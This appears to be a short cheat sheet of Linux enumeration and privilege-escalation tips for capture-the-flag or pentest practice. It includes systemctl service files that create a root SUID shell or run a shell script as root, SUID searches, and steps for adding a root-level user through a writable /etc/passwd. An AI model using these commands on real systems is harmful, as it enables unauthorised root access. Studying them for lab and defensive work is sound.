# Linux Enumeration Tips


## /bin/systemctl
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chown root:root /tmp/sh; chmod u+s /tmp/sh"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "python /tmp/shell.py"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

## Grep all file for string
```
grep -ilR "flag11" / 2>/dev/null
```

## Remove all newline space from file 
```
tr -d "\n\r" < yourfile.txt
```

## Remove specific character or space from Nano
```
ctrl + \
search the file _char
replace the file _char
choose option
```

## Find SUID Files
```
find / -perm -u=s -type f 2>/dev/null
```

## /etc/passwd file
```
The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:

test:x:0:0:root:/root:/bin/bash => [as divided by colon (:)]

    1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
    2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
    3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
    4. Group ID (GID): The primary group ID (stored in /etc/group file)
    5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
    6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
    7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

How to exploit a writable /etc/passwd

If we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. 

Create the password you want to add: "openssl passwd -1 -salt [salt] [password]"

```